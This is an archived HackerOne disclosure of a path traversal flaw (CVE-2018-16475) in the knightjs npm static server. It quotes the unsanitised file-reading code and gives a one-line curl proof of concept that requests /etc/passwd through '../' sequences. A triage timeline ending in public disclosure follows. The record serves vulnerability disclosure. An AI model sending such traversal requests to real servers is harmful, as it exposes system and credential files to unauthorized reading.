---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/path-traversal
  - env/web
  - stack/node
substate: "resolved"
weakness: "Path Traversal"
enriched: true
body: true
date: 2018-11-02
submitted: 2018-09-01T03:44:25.065Z
bounty_usd: null
votes: 8
cve: "CVE-2018-16475"
program: "[[programs/nodejs-ecosystem|Node.js third-party modules]]"
reporter: "abdilahrf_"
source: "https://hackerone.com/reports/403707"
title: "[knightjs] Path Traversal allows to read content of arbitrary files"
---
# [knightjs] Path Traversal allows to read content of arbitrary files

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 8 | **Program:** Node.js third-party modules | **Disclosed:** 2018-11-02

- Report: [https://hackerone.com/reports/403707](https://hackerone.com/reports/403707)
- CWE: Path Traversal | CVE: CVE-2018-16475
- Submitted: 2018-09-01T03:44:25.065Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

I would like to report Path Travelsal in Knightjs
It allows attacker to read content of arbitary file on remote server.

# Module

**module name:** Knightjs
**version:** 0.0.1
**npm page:** `https://www.npmjs.com/package/knightjs`

## Module Description

knight is a simple static server without configuration on the top of Node.js.

## Module Stats

~ 10-20 / month

# Vulnerability

## Vulnerability Description

There is no sanitation to the path provided from requests

```
            fs.readFile(pathname, (err, data) => {
                if (err) {
                    res.statusCode = 500
                    res.end(`Error getting the file: ${err}.`)
                } else {
                    res.statusCode = 200
                    // based on the URL path, extract the file extention. e.g. .js, .doc, ...
                    const ext = path.parse(pathname).ext
                    // if the file is found, set Content-type and send data
                    res.setHeader('Content-type', mime[ext] || 'text/plain')
                    res.end(data)
                }
            })
```

and if the file exist they will print the data

## Steps To Reproduce:

- `npm i knightjs`
- `node node_modules/knightjs/bin/knight`
- `curl --path-as-is http://localhost:4000/../../../../../../etc/passwd -v`

F340872


# Wrap up
- I contacted the maintainer to let them know: N]
- I opened an issue in the related repository: N

## Impact

It allows attacker to read content of arbitary file on remote server.

## Timeline

- **Report Filed**
- **2018-09-01** @api_xmgchqhv69rw1zem6733xop0tz: Hello,
Thanks for reporting this to us. Someone will quickly look at this report and triage it.
- **Report Triaged**
- **Report Severity Updated**
- **2018-09-10** @lirantal: Thanks @abdilahrf_ 

I reached out to the maintainer to join the conversation here.
- **Changed Scope**
- **2018-10-12** @abdilahrf_: seems the author is not coming to this report, should we disclose this ?
- **2018-10-13** @lirantal: Due to inactivity from the maintainer I opened an issue in the repository:  https://github.com/skyang/knight/issues/2
- **2018-11-02** @lirantal: I was able to reproduce and confirm the issue as you described and will triage this report as vulnerability.
I reached out to the maintainer via the github issue as well as sent an invite the package maintainer to this issue yet with no response.

I will move forward with disclosing the vulnerability.
- **Report Resolved**
- **Agreed On Going Public**
- **Manually Disclosed**
- **2026-08-28** @abdilahrf_: Hi, this report is currently in my pending bounty tabs. Could you please mark this report as ineligible for a bounty so that my pending bounty tabs can be cleared?
